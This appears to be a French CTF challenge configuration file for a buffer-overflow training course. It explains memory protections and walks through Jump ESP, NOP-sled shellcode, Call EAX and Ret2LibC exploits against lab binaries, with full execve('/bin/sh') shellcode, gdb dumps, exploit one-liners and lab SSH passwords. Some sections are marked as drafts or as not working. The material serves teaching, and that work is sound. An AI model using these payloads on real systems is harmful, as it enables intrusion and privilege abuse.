#
# ctf-buffer
#
# Configuration des challenges
#
# [XXX] Label du challenge, doit être unique, sans contrainte particulière
# name: Home Sweet Home : Nom du challenge tel qu'il apparait sur les pages HTLM
# value: 10 : Nombre de points marqués pour la résolution du challenge
# category: Ghost in the Shell : Catégorie regroupant plusieurs challenges
# flag: flag_{m0n_pr3m13r_fl4g} : format libre
# file: (optionnel) : le nom d'un fichier qui sera téléchargeable par les participants.
# description: 
#    La description peut tenir sur une ou plusieurs lignes.
#    [espace !!] Les lignes de la description doivent commencer par un ESPACE ou une TABULATION
#    Dès qu'une ligne recommence à la première colonne, on a terminé la description
#    Cette description est collée dans du HTML après un passage dans un léger parser Markdown
#    Utiliser la balise </br> pour chaque retour à la ligne
#    Mettre les morçeaux de code ou commande entre deux lignes de ```
#    ```
#    $ commande shell, ou bout de code
#    ```



[Intro]
category: Buffer overflows 2
label: Buffer overflows - 2
theme: Training
docker: ctf-buffer
description: 
    ## Buffer overflows - 2
    .
    <b>Protections contre les overflows</b>
    Pour contrer les buffers overflow de nombreuses méthodes ont été mises en place au fil des ans:
    ```
    NX-bit : Non Executable stack and heap 
    ASLR: Adress Space Layout Randomization : Les adresses de la stack et heap d'un programme changent à chaque lancement.
    PIE: Position Independant Executable    : Les adresses des fonctions internes d'un programme changent à chaque lancement.
    SSP/canary: Stack Smashing Protection   : Une valeur permet de détecter les dépassements de buffer
    READ Only Relocation                    : La table d'offsets des fonctions importées de librairies dynamiques (GOT) devient Read Only
    SOURCE_FORTIFY : le compilateur vérifie la longueur des arguments dans les fonctions à risque (strcpy)
    ```
    .
    <b>Contournement des protections</b>
    A chaque niveau de sécurité correspond un contournement de plus en plus complexe:
    ```
    Sécurité des binaires:
    Pile éxécutable : Injecter une payload et rediriger EIP dessus 
    NX-bit          : Ret2LibC
    ASLR            : Rop, ou GOT/PLT Overwrite
    SSP             : Leak ou brute force du canary 
    PIE             : Ca s'exploite... mais ça devient brutal
    ```
    .
    <b>VM d'entrainement</b>
    Des VMs vulnérables sont mises à disposition sur : https://exploit.education/
    Protostar : Stack et Heap overflow basiques
    Fusion    : Stack overflow avancés
    Phoenix   : Nouvelle version de Protostar enrichie de plusieurs plateformes: 32bits et 64 bits
    Protostar et Fusion sont instancées et accessibles via openvpn. Onglet [VMs]
    .
    <b>Site d'entrainement</b>
    https://exploit.courses/#/challenges
    .
    <b>Tutoriels web</b>
    Tutoriel par Hack'n do [https://beta.hackndo.com/buffer-overflow/]
    PIE: https://stackoverflow.com/questions/2463150/what-is-the-fpie-option-for-position-independent-executables-in-gcc-and-ld
    SSP: https://www.dailysecurity.fr/la-stack-smashing-protection/
    FORTIFY: https://access.redhat.com/blogs/766093/posts/1976213
    RELRO: https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro


# cours de référence: https://github.com/dobin/yookiterm-slides

# Win64: https://www.dailysecurity.fr/windows_exploit_64_bits_rop/    
# Onegadget: https://github.com/david942j/one_gadget
# https://github.com/JonathanSalwan/ROPgadget
# https://github.com/sashs/Ropper
# libc database: https://github.com/niklasb/libc-database
# libc database web: https://libc.blukat.me/
# https://github.com/Gallopsled/pwntools

# bypass: https://made0x78.com


# bypass fortify: https://pwning.re/2017/11/19/hxp-flag-store/

# https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-return-to-libc/
[Buffer2_secdetect]
name:  Détection des sécurités
value: 50
category:  Buffer overflows 2
flag:  
file: checksec.sh
description: 
    <b>NX bit</b>
    ```
    $ readelf -l vuln | grep GNU_STACK
    ...
    Program Headers:
    Type      Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
    GNU_STACK 0x000000 0x00000000 0x00000000 0x00000 0x00000 RW 0x4
    => RW : Pas de E, la pile n'est pas executable.
    ```
    <b>ASLR</b>
    ```
    cat /proc/sys/kernel/randomize_va_space
    0 : Off
    1 : On
    2 : Default
    ```
    <b>Pwntools checksec</b>
    ```
    $ pwn checksec `which ls`
    [*] '/bin/ls'
        Arch:     amd64-64-little
        RELRO:    Full RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled
        FORTIFY:  Enabled
    ```
    <b>trapkit.de checksec</b>
    ```
    http://www.trapkit.de/tools/checksec.html
    $ wget http://www.trapkit.de/tools/checksec.sh
    $ ./checksec.sh --file `which ls`
    RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
    Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   /bin/ls
    ```




[Buffer2_overflow_esp]
name:  Ret2Reg - Jump ESP
value: 50
file:  buffer_05.c
category:  Buffer overflows 2
flag:  1012
description: 
   ```
    ssh zapp@IPSERVER         
    mdp: kif
    ```
    Avant 2005, sous Linux, la Stack était toujours située à la même adresse, ce qui rendait les exploits de buffer relativement faciles.
    La protection ASLR (Address Space Layout Randomization) a donc été introduite: à chaque lancement d'un programme d'adresse de sa Stack change.
    Cette protection est activée par défaut sur Linux depuis le kernel 2.6.20 (juin 2005).
    .
    Les techniques appelées Ret2Reg, utilisent des registres qui pointent déjà vers la Stack. 
    La technique de Jump ESP permet de se passer de la connaissance de l'adresse de la Stack.
    Elle consiste littéralement à dire au processeur: 'ta prochaine instruction se trouve à l'adresse pointée par le registre ESP... Or le registre ESP a pour vocation de pointer la Stack.
    .
    Il faut trouver dans le code du programme l'instruction en assembleur 'jmp ESP', et mettre son adresse dans EIP.
    Dans un gros programme, on a des chances d'en trouver une. Dans le cadre d'un CTF, cette instruction est volontairement introduite :).
    .
    Cherchons l'adresse d'un 'jmp esp' dans notre binaire avec 'objdump -d xxx' :
    ```
    $ objdump -d say_hello5| grep esp | grep jmp
    0804846b <jmp_esp>:
    804846e:	ff e4                	jmp    *%esp
    ```
    Nous en avons une en 0x0804846e.
    Sur un processeur Intel, nous l'écrivons en inversant l'ordre les octets '\x6e\x84\x04\x08'.
    Nous faisons comme sur les exploits précédents, et plaçons l'adresse de cette instruction dans EIP.
    .
    Nous plaçons ensuite sur la stack une payload en assembleur qui va ouvrir un shell /bin/sh.
    ```
    # ./say_hello5 $(python -c "print '\x90'*(212)+'\x6e\x84\x04\x08'+'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'")
    ```
    Remplaçez l'adresse par celle correspondant à votre système.
 


# desassembleur : https://onlinedisassembler.com/odaweb/
# syscall list : https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html
[Buffer2_shellcode]
name:  Shellcode : sys_execve("/bin/sh")
status: 
value: 50
file:   
category:  Buffer overflows 2
flag:   
description: 
    Nous allons travailler avec un shell code qui est une référence.
    ```
    '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'
    ```
    Il a été détaillé par Aleph one dans son article sur les Buffers overflows http://phrack.org/issues/49/14.html.
    .
    Lire la section 'Shell Code' pour plus de détail.
    Aleph One compile un programme en C qui lance un shell /bin/sh.
    ```C
    #include <stdio.h>
    |void main() {
    |   char *name[2];
    |    name[0] = "/bin/sh";
    |    name[1] = NULL;
    |    execve(name[0], name, NULL);
    |}
    ```
    Il récupère le code assembleur généré par gcc, et le modifie à la main pour retirer les caractères tels que \x00.
    Une fois optimisé, il obtient:
    ```
    label_start:                       ; 1 - nous n'avons aucune idée de l'adresse ou se trouve /bin/sh
    \xeb\x1f        jmp loc_00000021   ; 1 - on saute 21 bytes plus loin avec un jump
    label_continue:
    \x5e            pop esi            ; 3 - on récupère l'adresse de /bin/sh avec un pop et on la place dans esi

    label_sys_execve:                  ; 3- on prépare les paramètres de la fonction sys_execve
    \x89\x76\x08    mov DWORD PTR [esi+0x8],esi  ; 3- on sauve l'adresse de /bin/sh en [esi+0x8]
    \x31\xc0        xor eax,eax        ; 3 - eax=0000
    \x88\x46\x07    mov BYTE PTR [esi+0x7],al ; 3- on s'assure que /bin/sh se termine par un caractère null
    \x89\x46\x0c    mov DWORD PTR [esi+0xc],eax ; 3- on place 0000 en [esi+0xc]
    \xb0\x0b        mov al,0xb         ; 3- eax = 0x0b : appel de sys_execve
    \x89\xf3        mov ebx, esi       ; 3- ebx : adresse de l'adresse de /bin/sh
    \x8d\x4e\x08    lea ecx,[esi+0x8]  ; 3- ecx : adresse de /bin/sh
    \x8d\x56\x0c    lea edx,[esi+0xc]  ; 3- edx : adresse du null long word
    \xcd\x80        int 0x80           ; 3- On déclenche l'appel à  sys_execve 

    \x31\xdb        xor ebx,ebx        ; 4- On place 0 dans ebx : sys_exit retourne 0
    \x89\xd8        mov eax,ebx        ; 4- on place 0 dans eax
    \x40            inc eax            ; 4- et on l'incémente à 1 => la fonction appellée par int80 est sys_exit
    \xcd\x80        int 0x80           ; 4- On appelle int 0x80 pour appeler sys_exit et quitter proprement
    loc_00000021:
    \xe8\xdc\xff\xff\xff call offset_to_label_pop ; 2 - on revient en arrière de 23 bytes avec un call. L'adresse actuelle est sauvée  dans la pile. Cette adresse est aussi celle de /bin/sh
    loc_esi:
    /bin/sh
    loc_esi+7:
    0                                  ; forcé  à 0
    loc_esi+8: 
    xxxx                               ; contiendra l'adresse de /bin/sh
    loc_esi+c: 
    0000                               ; contiendra un double word null
    ```
    Ne jamais utiliser un shell sans savoir ce qu'il fait.
    Pour retrouver les appels de fonction:
    Rechercher les int 80 et vérifier la valeur de ebx lors de l'interruption.
    Utiliser un desassembleur : https://onlinedisassembler.com/odaweb/
    Trouver la fonction appelée dans une table Linux System Call : https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html
    .
    Ce shell est un shell linux en 32 bits.



[Buffer2_shellcode2]
name:  Shellcode2 : sys_execve("/bin//sh")
status: 
value: 50
file:   
category:  Buffer overflows 2
flag:   
description: 
    ```
    "\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81";
    ```
    ```
    31 c0                	 xor    %eax,%eax     ; eax = 0000
    50                   	 push   %eax          ; on place 0 sur la stack
    68 2f 2f 73 68       	 push   $0x68732f2f   ; on place //sh sur la stack
    68 2f 62 69 6e       	 push   $0x6e69622f   ; on place /bin
    89 e3                	 mov    %ebx,%esp     ; on met l'adresse de /bin//sh dans ebx
    50                   	 push   %eax          ; on place 0 sur la stack
    53                   	 push   %ebx          ; on place l'adresse de /bin//sh sur la stack
    89 e1                	 mov    %ecx, %esp    ; ecx = adresse de l'adresse de /bin//sh
    99                   	 cltd                 ; edx is filled with the most significant bit of eax: 0
    b0 0b                	 mov    $0xb,%al      ; eax = 0x0b : appel de sys_execve
    cd 80                	 int    $0x80         ; appel de sys_execve()
    ```
    source: http://shell-storm.org/shellcode/files/shellcode-491.php


# 64 bit payload https://www.exploit-db.com/exploits/42179
#                http://shell-storm.org/shellcode/files/shellcode-806.php


# ko : va_space 2
[Buffer2_overflow4]
name:  Execution d'un shell en controlant EIP
status: draft
value: 50
file:  buffer_04.c
category:  Buffer overflows 2
flag:  1012
description: 
   ```
    ssh fry@IPSERVER         
    mdp: futur
    ```
    En prérequis à ce challenge la commande suivante doit retourner un 0.
    Si vous avez un 1 ou un 2, le niveau de protection de votre système ne permet pas de l'executer, passez au challenge suivant.
    ```
    cat /proc/sys/kernel/randomize_va_space
    ```

    Dans les deux  challenges précédent, nous avons généré un buffer overflow, et pris le controle du pointeur vers la prochaine instruction à executer.
    Dans celui-ci nous allons injecter nos propres instructions à executer: notre payload.
    Ces instructions sont des suites de commandes en assembleur.
    Il en existe de toutes prêtes sur : [http://shell-storm.org/shellcode/]
    ```
    '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'
    ```
    Notre payload va executer l'appel system(/bin/sh) pour ouvrir un shell.
    Nous utilisons /bin/sh plutot que /bin/bash : bash est réputé baisser les privilèges sur les programmes avec un sticky bit.
    Elle fait 45 caractères de long.
    Nous allons ajouter des instructions assembleur NOP devant cette payload pour atteindre 112 caractères.
    L'instruction NOP veut juste dire 'ne fais rien' et passe à l'instruction suivante.
    Elle s'écrit 0x90 en assembleur.
    Suite de NOP est une suite de 0x90909090 en mémoire, on parle d'une rampe de NOP - ROP Sledge
    Nous allons faire pointer l'adresse de la prochaine instruction au milieu de ces NOP.
    .
    Nous allons récupérer l'adresse de ces NOP à l'aide du débogueur gdb.
    Le binaire a été compilé avec des options de débogage, ça nous simplifie la vie. 
    Nous plaçons un point d'arret à la ligne 21, lançons l'execution du programme, puis demandons d'affichage des données (la Stack).

    ```
    fry@ctf-buffer:~$ gdb -batch -ex='unset env LINES' -ex='unset env COLUMNS' -ex='b 21' -ex='run' -ex='x/300x $esp' -args  ./say_hello4 $(python -c "print '\x90'*(1012-45)+'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'+'\x20\xd7\xff\xff'") 
    Breakpoint 1 at 0x8048459: file buffer_04.c, line 21.

    Breakpoint 1, say_hello (arg=0xffffdaa9 '\220' <repeats 200 times>...) at buffer_04.c:21
    21          printf("Hello %s\n", buffer);
    0xffffd4c0:     0x00000004      0x00000007      0x90909090      0x90909090
    0xffffd4d0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd4e0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd4f0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd500:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd510:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd520:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd530:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd540:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd550:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd560:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd570:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd580:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd590:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd5a0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd5b0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd5c0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd5d0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd5e0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd5f0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd600:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd610:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd620:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd630:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd640:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd650:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd660:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd670:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd680:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd690:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd6a0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd6b0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd6c0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd6d0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd6e0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd6f0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd700:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd710:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd720:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd730:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd740:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd750:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd760:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd770:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd780:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd790:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd7a0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd7b0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd7c0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd7d0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd7e0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd7f0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd800:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd810:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd820:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd830:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd840:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd850:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd860:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd870:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd880:     0x90909090      0x90909090      0x90909090      0xeb909090
    0xffffd890:     0x76895e1f      0x88c03108      0x46890746      0x890bb00c
    0xffffd8a0:     0x084e8df3      0xcd0c568d      0x89db3180      0x80cd40d8
    0xffffd8b0:     0xffffdce8      0x69622fff      0x68732f6e      0x08048400
    0xffffd8c0:     0xffffdaa9      0xffffd984      0xffffd994      0x080484f1
    0xffffd8d0:     0xf7fcb3dc      0xffffd8f0      0x00000000      0xf7e31637
    0xffffd8e0:     0xf7fcb000      0xf7fcb000      0x00000000      0xf7e31637
    0xffffd8f0:     0x00000003      0xffffd984      0xffffd994      0x00000000
    0xffffd900:     0x00000000      0x00000000      0xf7fcb000      0xf7ffdc04
    0xffffd910:     0xf7ffd000      0x00000000      0xf7fcb000      0xf7fcb000
    0xffffd920:     0x00000000      0x76bd70aa      0x4f277eba      0x00000000
    0xffffd930:     0x00000000      0x00000000      0x00000003      0x08048340
    0xffffd940:     0x00000000      0xf7fee010      0xf7fe8880      0xf7ffd000
    0xffffd950:     0x00000003      0x08048340      0x00000000      0x08048361
    0xffffd960:     0x08048473      0x00000003      0xffffd984      0x080484d0
    ```
    Nous avons ci-dessus le dump mémoire de la zone de donnée.
    .
    La colonne de gauche donne les adresses, les 4 colonnes de droite le contenu de la mémoire.
    On retrouve bien les 967 NOP, puis la payload, et enfin l'adresse de la prochaine instruction.
    .
    Nous allons prendre une adresse dans le premier tiers de la zone des NOP, et la saisir à la place de BBBB.
    Nous prenons une adresse dans la zone de NOP, car le début exact de la zone des données va changer entre un process lancé normalement et le même process sous déboggeur.
    L'adresse exacte dépend entre autre des variables d'environnement. Une adresse dans le premier tiers de la zone nous permet d'avoir un peu de marge.
    Petites contraintes: Cette adresse ne doit pas contenir le caractère 00, et elle va s'écrire à l'envers. Sur un processeur i386, les adresses s'écrivent la partie de poid faible à gauche.
    .
    Prenons par exemple l'adresse: 0xffffd560
    Elle va s'écrire '\x60\xd5\xff\xff'
    Modifiez l'adresse à la fin, et lançez de la commande suivante :
   
    ```
    ./say_hello4 $(python -c "print '\x90'*(1012-45)+'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'+'\x60\xd5\xff\xff'")

    ```
    Si le shell ne se lance pas, essayez avec une autre adresse au milieu, ou dans le dernier tiers des NOP.
    .
    Le flag s'affichera quand vous obtiendrez votre shell.
    






[Buffer2_overflow_eax]
name:  Call EAX
status: draft
value: 50
file:  buffer_05.c
category:  Buffer overflows 2
flag:  1012
description: 
    NOTE: Ne fonctionne pas....
    ```
    ssh zapp@IPSERVER         
    mdp: kif
    ```
    Une seconde technique de contournement de l'ASLR est le 'Call EAX'. Elle ne fonctionnement que dans le cas très précis ou la fonction qui va écrire notre payload dans la Stack est la dernière fonction appelée juste avant le retour de fonction, et place l'adresse du buffer copié dans le registre EAX.
    Ce n'est pas courant, mais ça se trouve. 
    .
    La fonction strcpy qui génère notre overflow est appelée juste avant le retour de la fonction. Cette fonction va placer dans le registre ESP un pointeur vers le buffer copié qui contient notre payload.
    Il faut trouver dans le code du programme une instruction en assembleur qui génère un appel vers l'adresse stoquée dans ESP.
    C'est à dire un 'call EAX'.
    ```
    $ # objdump -d say_hello5| grep eax | grep call
    80483d3:	ff d0                	call   *%eax
    
    ```
    On utilise 'objdump -d xxx' pour trouver l'adresse d'une fonction 'call eax'.
    Nous en avons une en 0x080483d3.
    Nous reprenons l'exploit précédent, en changeant d'adresse des ROP par l'adresse de cette instruction.
    ```
    # ./say_hello5 $(python -c "print '\x90'*(212-45)+'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'+'\x6e\x84\x04\x08'")
    ```
 


[Buffer2_overflow_ret2libc]
name:  Ret2LibC
status: 
value: 50
file:  buffer_05.c
category:  Buffer overflows 2
flag:  1012
description: 
    ```
    ssh zapp@IPSERVER         
    mdp: kif
    ```
    L'ASLR est activé: Le système place les programmes aléatoirement en mémoire. Il n'est plus possible de trouver les adresses des fonctions.
    Hack n do a réalisé un excellent tuto sur le ret2libC : https://beta.hackndo.com/retour-a-la-libc/
    .
    <b>Méthode</b>
    Nous utilisons les adresses des fonctions de la libC qui est partagée par de nombreux programmes.
    Nous utilisons un appel à la fonction 'system', et à la fonction 'exit'.
    Nous allons placer la chaine '/bin/sh' dans une variable d'environnement et récupérer son adresse.
    Nous allons utiliser la payload suivante: 
    ```
    [x*0x90][adresse system][adresse exit][adresse /bin/sh]
    ```

    <b>Trouver n</b>
    ```
     gdb -batch -ex='run' -args ./say_hello5 $(python pattern.py 300)
    Hello Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9

    Program received signal SIGSEGV, Segmentation fault.
    0x31684130 in ?? ()

    $ python pattern.py 0x31684130
    Pattern 0x31684130 first occurrence at position 212 in pattern.
    ```
    n vaut 212.
    .
    <b>Adresse de 'system' dans la libC</b>
    ```
    gdb -batch -ex='b 36' -ex='run' -ex='print system' -args ./say_hello5 $(python -c "print '\x90'*(212)")
    Breakpoint 1 at 0x8048503: file buffer_05.c, line 36.
    Breakpoint 1, main (argc=2, argv=0xffffdc64) at buffer_05.c:36
    36          if (argc<=1) { 
    $1 = {<text variable, no debug info>} 0xf7e51da0 <__libc_system>
    ```
    Adresse de system: 0xf7e51da0  
    .
        <b>Adresse de 'exit' dans la libC</b>
    ```
    # gdb -batch -ex='b 36' -ex='run' -ex='print exit' -args ./say_hello5 $(python -c "print '\x90'*(212)")
    Breakpoint 1 at 0x8048503: file buffer_05.c, line 36.

    Breakpoint 1, main (argc=2, argv=0xffffd774) at buffer_05.c:36
    36	    if (argc<=1) { 
    $1 = {<text variable, no debug info>} 0xf7e479d0 <__GI_exit>
    ```
    Adresse de exit: 0xf7e479d0  
    .
    <b>Adresse de '/bin/sh'</b>
    Injectons la chaine de caractères /bin/sh dans une variable d'environnement.
    ```
    # export MYSHELL=/bin/sh
    ```
    Récupérons l'adresse 
    ```
    # gdb -batch -ex='b 36' -ex='run' -ex='x/30s *((char **)environ)' -args ./say_hello5 $(python -c "print '\x90'*(212)")
    Breakpoint 1 at 0x8048503: file buffer_05.c, line 36.

    Breakpoint 1, main (argc=2, argv=0xffffd774) at buffer_05.c:36
    36	    if (argc<=1) { 
    0xffffd97c:	"HOSTNAME=0df9c752089e"
    ...
    0xffffd9d4:	"MYSHELL=/bin/sh"
    0xffffd9e4:	"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
    ...
    0xffffdfca:	"PWD=/home/zapp"
    0xffffdfd9:	"LINES=28"
    0xffffdfe2:	"/home/zapp/say_hello5"
    ```
    Adresse de "MYSHELL=/bin/sh" quand on est dans un contexte gdb: 0xffffd9d4  
    ! On décale l'adresse des 8 caractères de "MYSHELL=" !
    Adresse de "/bin/sh" quand on est dans un contexte gdb: 0xffffd9dc
    .
    <b>Construction de la payload</b>
    ```
    [212*0x90][adresse system][adresse exit][adresse /bin/sh]
    '\x90'*(212)+'\x70\x83\x04\x08'+'\xd0\x79\xe4\xf7'+'\xdc\xd9\xff\xff'
    ```

    ./say_hello5 $(python -c "print '\x90'*(212)+'\x70\x83\x04\x08\xd0\x79\xe4\xf7\xd4\xd9\xff\xff'")

    En 64 bit, on n'utilise plus la pile, mais les registres. Il faut donc passer ces 3 adresses dans des registres.

    ```
    $ gdb -batch -ex='run'  -args  ./say_hello5 $(python -c "print '\x90'*(212)+'\xa0\x1d\xe5\xf7\xd0\x59\xe4\xf7\x7d\xde\xff\xff'")
    Hello ������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������Y��}���
    zapp@ctf-buffer:~ $
    ```
    Pour vérifier que nous sommes bien dans un shell fils de notre process, utilisons la commande:
    ```
    $ ps eaxf
    PID TTY      STAT   TIME COMMAND
        1 ?        Ss     0:00 /usr/sbin/sshd -D
        6 ?        Ss     0:00 sshd: zapp [priv]
    16 ?        S      0:00  \_ sshd: zapp@pts/0
    17 pts/0    Ss     0:00      \_ -bash USER=zapp LOGNAME=zapp HOME=/home/zapp PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bi
    402 pts/0    S      0:00          \_ gdb -batch -ex=run -args ./say_hello5 ???????????????????????????????????????????????????????????????????
    404 pts/0    S      0:00              \_ /home/zapp/say_hello5 ???????????????????????????????????????????????????????????????????????????????
    408 pts/0    S      0:00                  \_ sh -c /bin/bash SHELL=/bin/bash TERM=xterm-color SSH_CLIENT=16.3.0.2 52860 22 SSH_TTY=/dev/pts/0
    409 pts/0    S      0:00                      \_ /bin/bash MAIL=/var/mail/zapp SSH_CLIENT=16.3.0.2 52860 22 USER=zapp SHLVL=1 HOME=/home/zapp
    412 pts/0    R+     0:00                          \_ ps eaxf SHELL=/bin/bash TERM=xterm-color SSH_CLIENT=16.3.0.2 52860 22 SSH_TTY=/dev/pts/0
    zapp@ctf-buffer:~$ 
    ```

    


[Buffer2_bin_sh_libc]
name:  Trouver /bin/sh dans la libC
status: 
value: 50
file:   
category:  Buffer overflows 2
flag:   
description: 
    Pour s'arréter en début de programme:
    ```
    -ex='b 36'        -ex='run'
    -ex='break main'  -ex='run'
    ```
    Pour trouver l'adresse de /bin/sh dans la libC, sans avoir à créer une variable d'environnement:
    ```
    -ex='find &system,+9999999,"/bin/sh"'
    -ex='find __libc_start_main,__libc_start_main+99999999,"/bin/sh"'
    ```
    ```
    $ gdb -batch -ex='b 36'  -ex='run' -ex='find __libc_start_main,__libc_start_main+99999999,"/bin/sh"'  -args ./say_hello5 $(python -c "print '\x90'*(212)")
    
    Breakpoint 1 at 0x8048503: file buffer_05.c, line 36.
    Breakpoint 1, main (argc=2, argv=0xffffdc64) at buffer_05.c:36
    36          if (argc<=1) { 
    process 469
    0xf7f72a0b
    warning: Unable to access 16000 bytes of target memory at 0xf7fcc793, halting search.
    1 pattern found.
    ```
    /bin/sh est présent à l'adresse: 0xf7f72a0b
    .
    Vérifier le contenu de l'adresse:
    ```
    $ gdb -batch -ex='b 36'  -ex='run' -ex='x/s 0xf7f72a0b'  -args ./say_hello5 $(python -c "print '\x90'*(212)")
    Breakpoint 1 at 0x8048503: file buffer_05.c, line 36.
    Breakpoint 1, main (argc=2, argv=0xffffdc64) at buffer_05.c:36
    36          if (argc<=1) { 
    process 476
    0xf7f72a0b:     "/bin/sh"
    ```



[Buffer2_plages_adresses]
name:  Trouver les plages d'adresses utiles pour rechercher des valeurs en mémoire
status: 
value: 50
file:   
category:  Buffer overflows 2
flag:   
description: 
    On lance gdb, pose un breakpoint ligne 36, démarre le programme qui va s'arréter au break point et on demande : info proc map
    ```
